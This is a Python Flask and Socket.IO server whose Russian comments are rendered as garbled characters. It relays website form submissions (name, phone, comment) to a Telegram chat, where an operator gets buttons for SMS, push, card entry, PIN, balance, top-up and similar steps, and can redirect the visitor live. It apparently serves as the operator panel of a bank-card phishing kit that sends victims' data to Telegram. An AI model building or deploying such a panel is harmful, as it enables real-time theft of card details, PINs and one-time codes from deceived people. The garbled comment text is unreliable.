import eventlet
eventlet.monkey_patch()  # –í—ã–∑–æ–≤ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–µ—Ä–≤—ã–º!

import os
import time
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO

# –°–æ–∑–¥–∞–µ–º Flask-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∏ —Ä–∞–∑—Ä–µ—à–∞–µ–º CORS
app = Flask(__name__)
CORS(app)

# –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º SocketIO —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º eventlet
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
    raise ValueError("‚ùå –û—à–∏–±–∫–∞: TELEGRAM_BOT_TOKEN –∏–ª–∏ CHAT_ID –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!")
CHAT_ID = int(CHAT_ID)

print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω CHAT_ID: {CHAT_ID}")

# –ü—Ä–æ—Å—Ç–æ–π –º–∞—Ä—à—Ä—É—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞–±–æ—Ç—ã —Å–µ—Ä–≤–µ—Ä–∞
@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "OK", "message": "–°–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç!"}), 200

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram —Å inline –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π –∏ session_id
def send_telegram_message(data):
    try:
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π session_id (–Ω–∞ –æ—Å–Ω–æ–≤–µ –≤—Ä–µ–º–µ–Ω–∏)
        session_id = str(int(time.time()))
        message_text = (
            f"üì© –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å:\n\n–ò–º—è: {data.get('name')}\n"
            f"–¢–µ–ª–µ—Ñ–æ–Ω: {data.get('phone')}\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: {data.get('comment')}\n"
            f"Session ID: {session_id}"
        )
        # –§–æ—Ä–º–∏—Ä—É–µ–º inline –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É ‚Äì callback_data —Å–æ–¥–µ—Ä–∂–∏—Ç session_id
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "SMS", "callback_data": "redirect_sms:" + session_id},
                    {"text": "–ü—É—à", "callback_data": "push:" + session_id},
                    {"text": "–í–≤–æ–¥ –∫–∞—Ä—Ç—ã", "callback_data": "card:" + session_id},
                    {"text": "PIN", "callback_data": "pin:" + session_id}
                ],
                [
                    {"text": "–õ–∏–º–∏—Ç—ã", "callback_data": "limits:" + session_id},
                    {"text": "–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥", "callback_data": "wrong_code:" + session_id},
                    {"text": "–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞", "callback_data": "phone_number:" + session_id}
                ],
                [
                    {"text": "–°–≤–æ–π —Ç–µ–∫—Å—Ç/—Ñ–æ—Ç–æ", "callback_data": "custom_text:" + session_id}
                ],
                [
                    {"text": "–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ", "callback_data": "topup:" + session_id},
                    {"text": "–ë–∞–ª–∞–Ω—Å", "callback_data": "balance:" + session_id}
                ],
                [
                    {"text": "‚úÖ –£—Å–ø–µ—Ö", "callback_data": "success:" + session_id},
                    {"text": "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –õ–ö", "callback_data": "wrong_lk:" + session_id}
                ]
            ]
        }
        payload = {
            "chat_id": CHAT_ID,
            "text": message_text,
            "reply_markup": keyboard
        }
        print("üì© –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram: " + repr(payload))
        response = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json=payload,
            timeout=10
        )
        response_data = response.json()
        print(f"üì© –û—Ç–≤–µ—Ç Telegram: {response_data}")
        # –î–æ–±–∞–≤–ª—è–µ–º session_id –≤ –æ—Ç–≤–µ—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –Ω–∞ —Å–∞–π—Ç
        response_data["session_id"] = session_id
        return response_data
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
        return {"ok": False, "error": str(e)}

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ POST-–∑–∞–ø—Ä–æ—Å–∞ –æ—Ç —Å–∞–π—Ç–∞
@app.route("/send-to-telegram", methods=["POST"])
def handle_send_to_telegram():
    try:
        data = request.json
        print(f"üì© –ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ: {data}")
        if not data or "name" not in data or "phone" not in data:
            return jsonify({"error": "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–∞–Ω–Ω—ã—Ö"}), 400
        response_data = send_telegram_message(data)
        return jsonify(response_data)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: {e}")
        return jsonify({"error": str(e)}), 500

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ callback-–∑–∞–ø—Ä–æ—Å–æ–≤ –æ—Ç Telegram
@app.route("/callback", methods=["POST"])
def handle_callback():
    try:
        data = request.json
        print(f"üì© –ü–æ–ª—É—á–µ–Ω callback: {data}")
        if "callback_query" not in data:
            return jsonify({"error": "callback_query –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"}), 400
        callback_query = data["callback_query"]
        callback_data = callback_query.get("data")
        chat_id = callback_query["message"]["chat"]["id"]
        if not callback_data:
            return jsonify({"error": "–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç data"}), 400
        # –†–∞–∑–±–∏—Ä–∞–µ–º callback_data –≤ —Ñ–æ—Ä–º–∞—Ç–µ "action:session_id"
        action, session_id = callback_data.split(":")
        if action == "redirect_sms":
            print(f"‚úÖ –û–ø–µ—Ä–∞—Ç–æ—Ä –≤—ã–±—Ä–∞–ª SMS –¥–ª—è session_id {session_id}")
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–±—ã—Ç–∏–µ WebSocket –¥–ª—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
            socketio.emit("redirect", {"user_id": session_id, "url": "https://www.cikava-kava.com.ua/remont-kavomashyn-dnipro/"})
            response_text = "üì© SMS –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ! –ö–ª–∏–µ–Ω—Ç –±—É–¥–µ—Ç –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω."
        else:
            response_text = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞."
        payload = {"chat_id": chat_id, "text": response_text}
        response = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json=payload,
            timeout=10
        )
        print(f"üì© –û—Ç–≤–µ—Ç Telegram (callback): {response.json()}")
        return jsonify({"message": "Callback –æ–±—Ä–∞–±–æ—Ç–∞–Ω!"})
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –≤ callback: {e}")
        return jsonify({"error": str(e)}), 500

# WebSocket –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
@socketio.on("connect")
def handle_connect():
    print("‚úÖ WebSocket –ø–æ–¥–∫–ª—é—á–µ–Ω!")

@socketio.on("disconnect")
def handle_disconnect():
    print("‚ùå WebSocket –æ—Ç–∫–ª—é—á–µ–Ω!")

@socketio.on_error()
def handle_socket_error(e):
    print(f"‚ö† –û—à–∏–±–∫–∞ WebSocket: {e}")

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)
